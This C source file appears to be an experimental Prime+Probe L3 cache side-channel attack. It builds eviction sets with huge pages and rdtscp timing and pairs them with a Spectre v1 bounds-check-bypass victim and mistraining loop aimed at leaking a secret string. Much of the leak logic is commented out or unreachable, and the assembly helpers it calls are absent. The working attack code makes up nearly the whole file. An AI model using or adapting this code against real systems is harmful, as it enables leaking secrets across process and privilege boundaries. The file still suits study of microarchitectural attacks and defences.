#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <x86intrin.h>
#include <sched.h>
#include <pthread.h>

int probe(char **set, int ss, char *candidate);
void randomize_lines(char **ls, int s);
void minus(char **s1, int ss1, char **s2, int ss2, char **so, int *sso);
void print_line(char *l, int cr);
void fill_buf_list(char ***buf_list, char **set, int s);
void print_buf_list(char **buf_list, int s);

#define L3_PD_OFFSET_WIDTH 21   //Latge Page offset 0-20总共21位
#define MAP_HUGE_2MB (L3_PD_OFFSET_WIDTH << MAP_HUGE_SHIFT)// MAP_HUGE_SHIFT 26

/**
 * See
 * /sys/devices/system/cpu/cpu0/cache/index3/
 */

#define L3_LINE_WIDTH 6 // 64 octets  用octet专指8 bits构成的字节。
#define L3_SETS_WIDTH 12 // 4096 sets
#define L3_ASSOC 16 // 16 lines per set 16路
#define L3_RTAG_WIDTH (L3_PD_OFFSET_WIDTH - L3_SETS_WIDTH - L3_LINE_WIDTH)
#define L3_CACHE_SIZE (((1 << L3_LINE_WIDTH) << L3_SETS_WIDTH) \
    * L3_ASSOC) // 4 MB total size
#define L3_2MB_TAG_NB (1 << \
    (L3_PD_OFFSET_WIDTH - L3_LINE_WIDTH - L3_SETS_WIDTH))  //Tag的数量=8(3bit)
#define L3_SLICE_WIDTH 2 // Number of L3 cache slices
#define L3_TOTAL_SET_LINES (L3_ASSOC << L3_SLICE_WIDTH)

/**
 * Algorithm parameters
 */

#define L3_FACTOR_WIDTH 3 // times slices number times associativity
#define L3_LINES_NB ((L3_ASSOC << L3_SLICE_WIDTH) << L3_FACTOR_WIDTH)
#define L3_BUF_SIZE ((L3_LINES_NB / L3_2MB_TAG_NB) << 21)  //2^27
#define L3_TARGET_SET (0x65e & ((1 << L3_SETS_WIDTH) - 1))
#define L3_CACHE_MISS_THRESHOLD 100
#define L3_PROBE_PASSES 0x10


char *buf;
uint8_t temp = 0; 
size_t training_x;
static int results[256];
// static int index[256];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
unsigned int array1_size = 16;
char* secret = "The Magic Words are Squeamish Ossifrage.";
int mix_shuffle[1000];
int flag;
int flag_p;

char *lines[L3_LINES_NB];
char *cset[L3_LINES_NB];
// char *eset[L3_LINES_NB];
// char *tset[L3_LINES_NB];
// char *mset[L3_LINES_NB];
int css = 0;//, ess = 0, tss = 0, mss = 0;

void shuffle(int size)
{
  for(int i=0;i<size;i++)
  {
    mix_shuffle[i]=i;
  }

  for (int i = size - 1; i > 0; --i) { 
    // generate random index 
    int w = rand()%i; 
    // swap items 
    int t = mix_shuffle[i]; 
    mix_shuffle[i] = mix_shuffle[w]; 
    mix_shuffle[w] = t; 
  } 
}

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		buf[0x650000+array1[x] * 512]=1;
	}
}


void prime_attack() {
  // char **set, int ss, char *candidate


//   uint64_t time;
//   char **llp;
//  // int count = 0, at = 0;
//   int i;
//   uintptr_t rip;
//   if (ss > 0) {
//     print_line(candidate, 0);
//     printf(", ss 0x%x\n", ss);
//   } else {
//     return;
//   }
//   for (i = 0; i < L3_PROBE_PASSES; i++) {//16
//     if (ss > 0) {
//       __asm__ __volatile__("call asm_prime"
//           : "=a"(time), "=c"(llp), "=d"(rip) : "a"(set), "b"(ss), "c"(candidate));
//       // printf("Candidate access time %lu ", time);
//     // if (time > L3_CACHE_MISS_THRESHOLD) {
//     //     printf("M ");
//     // } else {
//     //     printf("H ");
//     //   count++;
//     // }
//     // at += time;
//     //   printf("\n");
//       //    return time > L3_CACHE_MISS_THRESHOLD;
//     }
//   }
//   // printf("hit count 0x%x, at %u average time, rip @0x%018lx\n", count, at /
//   //     L3_PROBE_PASSES, rip);
//   // printf("Last line pointer accessed @0x%016lx of list @0x%016lx\n",
//   //     (uintptr_t)llp, (uintptr_t)set);
//   // return count == 0;
//   // return count > (L3_PROBE_PASSES >> 1);
  // css=10;


  shuffle(css);
      for(int i=0;i<css;i++)
      {
       int mix_i=mix_shuffle[i];
        *(cset[mix_i])=100;
      }
}

int probe_attack(char **set, int ss, char *candidate) {
  uint64_t time;
  char **llp;
  int count = 0, at = 0;
  // int i;
  uintptr_t rip;

  // for (i = 0; i < L3_PROBE_PASSES; i++) {//16
    if (ss > 0) {
      __asm__ __volatile__("call asm_attack"
          : "=a"(time), "=c"(llp), "=d"(rip) : "a"(set), "b"(ss), "c"(candidate));
      printf("Candidate access time %lu ", time);
    if (time > L3_CACHE_MISS_THRESHOLD) {
        printf("M ");
    } else {
        printf("H ");
      count++;
    }
    at += time;
      printf("\n");
      //    return time > L3_CACHE_MISS_THRESHOLD;
    }
  // }
  printf("hit count 0x%x, rip @0x%018lx\n", count, candidate);
  printf("Last line pointer accessed @0x%016lx of list @0x%016lx\n\n",
      (uintptr_t)llp, (uintptr_t)set);
  return count == 0;
  // return count > (L3_PROBE_PASSES >> 1);
}


void train_attack(int tries,int malicious_x,char **buf_list,char *cset,int css)
{
    int j;
    size_t x;
  	training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
      fill_buf_list(&buf_list, (char**)(&cset[0]), css);
      prime_attack(buf_list,css,0);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */

			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */

			x = training_x ^ (x & (malicious_x ^ training_x));

			victim_function(x);
		}
}

int probe_test(int css,char *cset[],char *candidate)
{
   if (css <=0) {
    return 0;
  }
  uint64_t time;
  char **llp;
  int count = 0, at = 0;

	register uint64_t time1, time2;
  unsigned int ui;
  int junk;
// css=10;
for(int x=0;x<L3_PROBE_PASSES;x++)
{
      shuffle(css);
      *candidate=200;
      for(int i=0;i<css;i++)
      {
        int mix_i=mix_shuffle[i];
        *(cset[mix_i])=100;
      }

    	time1 = __rdtscp(&ui); /* READ TIMER */
      *candidate=200;
			time2 = __rdtscp(&ui) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
     //printf("%ld\n", (cset[10]));
      //  printf("%d\n",*(cset[20]));
      printf("time:%d\n",time2);

    if (time2 > L3_CACHE_MISS_THRESHOLD) {
        printf("M ");
    } else {
        printf("H ");
      count++;
    }
    printf("\n");
}

printf("hit cnt:%d \n",count);
return count<L3_PROBE_PASSES;
}
/**
 * To activate huge pages
 * # echo 512 > /proc/sys/vm/nr_hugepages
 */

// Processor specification:
//   Line width 0x6
//   Sets 0x1000
//   Associativity 0x10
//   Total L3 cache size 0x400000
// Algorithm parameters:
//   Associativity factor 0x8
//   Searching eviction set in 0x200 lines
//   Target set 0x65e of 0x1000
// Allocated pages @0x00007f3ccf600000 of size 0x08000000

void test()
{
  cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(2,&mask);
	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
	{
		   perror("pthread_setaffinity_np");
	}
    while (flag_p != 1) {}
	    flag_p = 0;
   //prime_attack();
    *(cset[0])=180;
    flag=1;
    printf("1\n");
}

void test1()
{
  cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(1,&mask);
	if(pthread_setaffinity_np(pthread_self(),sizeof(cpu_set_t),&mask)<0)
	{
		   perror("pthread_setaffinity_np");
	}

  register uint64_t time1, time2;
  unsigned int ui;
  int junk;

  flag_p=1;
  prime_attack();

    	while (flag != 1) {}
	    flag = 0;

    	time1 = __rdtscp(&ui); /* READ TIMER */
      *(cset[css-1])=100;
			time2 = __rdtscp(&ui) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      printf("time:%d\n",time2);

      if (time2 > L3_CACHE_MISS_THRESHOLD) {
          printf("M ");
      } else {
          printf("H ");
      }
      printf("\n");
    
}

int main(int argc, char *argv[]) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(0,&mask);
  if(sched_setaffinity(0,sizeof(mask),&mask)<0)
  {
    perror("sched_setaffinity");
  }
  char **buf_list;
  int p, t, l, i;//,lc;
  uintptr_t pa, ta;

  time_t now;

  size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

  buf = mmap(NULL, L3_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE |
      MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

  if (buf == MAP_FAILED) {
    perror("Mmap buf");
    return 1;
  }

  printf("Allocated pages @0x%016lx of size %d\n", (uintptr_t)buf,
      L3_BUF_SIZE);



  for (p = 0; p < (L3_BUF_SIZE >> L3_PD_OFFSET_WIDTH); p++) {
    //|32---------------------21|20----18|17------12|11-------6|5--------0|
    //|---------------Frame number------------------|------Page offset----|  4KB Page
    //|----Large frame numer----|-----------Large page offset-------------|  2MB page
    //|---------------TAG----------------|------Set Index----|-Line offset|  Cache Line
    pa = (uintptr_t)(buf + (p << L3_PD_OFFSET_WIDTH));
    for (t = 0; t < L3_2MB_TAG_NB; t++) {
      ta = pa | (t << (L3_LINE_WIDTH + L3_SETS_WIDTH));//tag address
      lines[p * L3_2MB_TAG_NB + t] =
          (char *)(ta | (L3_TARGET_SET << L3_LINE_WIDTH));//64*8行，64页，每个页8行
    }
  }

  /**
   * Displays the generated lines
   */
  for (l = 0; l < L3_LINES_NB; l++) {
  //  printf("Line %d @0x%016lx\n", l, (uintptr_t)lines[l]);
  }


  now = time(NULL);
  srand48(now);

  //L3_Line=512 page 64  每个page 8Line
  for (l = 0; l < L3_LINES_NB; l++) { //css:conflict set 数量  L3_LINES_NB
    printf("Line #0x%x  css:%d\n", l,css);
    fill_buf_list(&buf_list, &cset[0], css);
    // print_buf_list(buf_list, css);
    if (!probe(buf_list, css, lines[l])) {//如果hit则表示不冲突。
  //if(!probe_test(css,cset,lines[l])){
      printf("Add : non conflicting\n");
      cset[css] = lines[l];
      printf("%ld",cset[css]);
      
      css++;
      // return 0;
    } else {
      printf("Leave : conflicting\n");
    }
    if (css == L3_TOTAL_SET_LINES) {
      printf("NOTE : conflict set has reached required size : 0x%x\n", css);
//      break;
    }
  }

  /**
   * Displays the conflict set
   */
  printf("Size of conflict set 0x%x\n", css);
  for (l = 0; l < css; l++) {
  //  printf("Line @0x%016lx\n", (uintptr_t)cset[l]);
//  printf("%ld\n", (cset[l]));
  }





 shuffle(css);
 printf("css:%d\n",css);
//  printf("SSSSSSSSSSSSSSS\n");
//  for(i=0;i<css;i++)
//  {
//    printf("%d\n",mix_shuffle[i]);
//  }
//  printf("");
//  for(i=0;i<css;i++)
//  {
//   // int mix_i=mix_shuffle[i];
//    *(cset[i])=100;
//     // if(mix_i==20)
//     //  printf("%ld , %d\n\n",(cset[mix_i]),*(cset[mix_i]));
//  }
//   for(i=0;i<css;i++)
//  {
//    int mix_i=mix_shuffle[i];
//    *(cset[mix_i])=100;
//  }

  uint64_t time;
  char **llp;
  int count = 0, at = 0;
  // int i;
  uintptr_t rip;
  // fill_buf_list(&buf_list, &cset[0], css);
  // int junk;
  //     junk=*(cset[20]);

printf("\ntesting......\n");


  pthread_t pp_thread,pt_thread;

  // prime_attack();
flag=0;
flag_p=0;
  if(pthread_create(&pp_thread,NULL,test,NULL)!=0)
		{
			perror("pthread_create");
		}
  if(pthread_create(&pt_thread,NULL,test1,NULL)!=0)
		{
			perror("pthread_create");
		}

pthread_join(pp_thread, NULL);
pthread_join(pt_thread, NULL);








return 0;



// prime_attack();
for (i = 0; i < 256; i++)
		results[i] = 0;
fill_buf_list(&buf_list, &cset[0], css);
// prime_attack(buf_list,css,0);
print_buf_list(buf_list, css);

// print_buf_list(buf_list, css);
int tries,mix_i;
int cnt=0;
for (tries = 16; tries > 0; tries--)
	{
    // printf("xxxxxxxxx:%d\n",css);
    fill_buf_list(&buf_list, &cset[0], css);
    // prime_attack(buf_list,css,0);
    print_buf_list(buf_list, css);
   // train_attack(tries,malicious_x,buf_list,(char *)cset,css);
    printf("XXXXXXXXXXXXXXXXXXX  %d\n",css);
    print_buf_list(buf_list, css);
    printf("XXXXXXXXXXXXXXXXXXX\n");
    // if(probe_attack(buf_list,css,buf+0x650000+84*512))
    // {
    //   printf("M\n");
    //   cnt++;
    // }
    // else
    // {
    //   printf("H\n");
    // }

      // for (i = 0; i < 256; i++)
      //   {
      //     	mix_i = ((i * 167) + 13) & 255;
      //       printf("mix_id:%d\n",mix_i);
      //     if(probe_attack(buf_list,css,buf+0x650000+mix_i*512)&& mix_i != array1[tries % array1_size])
      //       results[mix_i]++; /* cache hit - add +1 to score for this value */
      //       // index[]=mix_i;
      //   }

  }

// int max=-1;
// int index;
// for(int i=0;i<256;i++)
// {
//   // printf("%d %d\n",i,results[i]);
//   if(results[i]>max)
//   {
//     max=results[i];
//     index=i;
//   }
// }
// printf("result:%c(%d)  |%d\n",index,index,max);


// printf("%d\n",cnt);
return 0;

}

/**
 * TODO Write it in assembly
 *
 * If conflict ? i.e. cache miss for candidate
 *
 */
int probe(char **set, int ss, char *candidate) {
  uint64_t time;
  char **llp;
  int count = 0, at = 0;
  int i;
  uintptr_t rip;
  if (ss > 0) {
    print_line(candidate, 0);
    printf(", ss 0x%x\n", ss);
  } else {
    return 0;
  }
  for (i = 0; i < L3_PROBE_PASSES; i++) {//16
    if (ss > 0) {
      __asm__ __volatile__("call asm_probe"
          : "=a"(time), "=c"(llp), "=d"(rip) : "a"(set), "b"(ss), "c"(candidate));
      printf("Candidate access time %lu ", time);
    if (time > L3_CACHE_MISS_THRESHOLD) {
        printf("M ");
    } else {
        printf("H ");
      count++;
    }
    at += time;
      printf("\n");
        //  return time > L3_CACHE_MISS_THRESHOLD;
    }
  }
  printf("hit count 0x%x, at %u average time, rip @0x%018lx\n", count, at /
     L3_PROBE_PASSES, rip);
  printf("Last line pointer accessed @0x%016lx of list @0x%016lx\n",
     (uintptr_t)llp, (uintptr_t)set);
  // return count ==0;
  return count <L3_PROBE_PASSES;
  // return count > (L3_PROBE_PASSES >> 1);
}

void randomize_lines(char **ls, int s) {
  int i;
  long int r;
  char *l;
  // Shuffle array
  for (i = s - 1; i > 0; i--) {
    r = lrand48() % (i + 1);
    // printf("RANDOM %lx\n", r);
    l = ls[i];
    ls[i] = ls[r];
    ls[r] = l;
  }
}

int in(char **s, int ss, char *e) {
  int i;
  for (i = 0; i < ss; i++) {
    if (s[i] == e) {
      return 1;
    }
  }
  return 0;
}

void minus(char **s1, int ss1, char **s2, int ss2, char **so, int *sso) {
  int i;
  *sso = 0;
  for (i = 0; i < ss1; i++) {
    // Search s1[i] in s2, if not, then add it to so
    if (!in(s2, ss2, s1[i])) {
      so[*sso] = s1[i];
      (*sso)++;
    }
  }
}

void print_line(char *l, int cr) {
  printf("Line @0x%016lx : rtag 0x%lx, set 0x%lx, line 0x%lx", (uintptr_t)l,
      (((uintptr_t)l) >> (L3_SETS_WIDTH + L3_LINE_WIDTH)) &
          ((1 << L3_RTAG_WIDTH) - 1),
      (((uintptr_t)l) >> L3_LINE_WIDTH) & ((1 << L3_SETS_WIDTH) - 1),
      ((uintptr_t)l) & ((1 << L3_LINE_WIDTH) - 1));
  if (cr) {
    printf("\n");
  }
}

void fill_buf_list(char ***buf_list, char **set, int s) {
  int i;
  char **tbf;
  if (s > 0 ){
    *buf_list = (char **)set[0];
//    printf("Buf list initial pointer @0x%016lx\n", (uintptr_t)*buf_list);
    tbf = (char **)*buf_list;
//    printf("Buf list first pointer value @0x%016lx\n", (uintptr_t)tbf);
    for (i = 1; i < s; i++) {
      *tbf = (char *)set[i];
//      printf("Set @0x%016lx to @0x%016lx\n", (uintptr_t)tbf,
//          (uintptr_t)set[i]);
      tbf = (char **)*tbf;
    }
    // We cycle the end !
    *tbf = (char *)set[s - 1];
  }
}

void print_buf_list(char **buf_list, int s) {
  int i;
  	register uint64_t time1, time2;
    unsigned int ui;
  printf("Print buf list of size 0x%x\n", s);
  for (i = 0; i < s; i++) {
     print_line((char *)buf_list, 1);
    	time1 = __rdtscp(&ui); /* READ TIMER */
			// junk = *addr; /* MEMORY ACCESS TO TIME */
      buf_list = (char **)*buf_list;
			time2 = __rdtscp(&ui) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
     printf("time:%d\n",time2);
  }
}
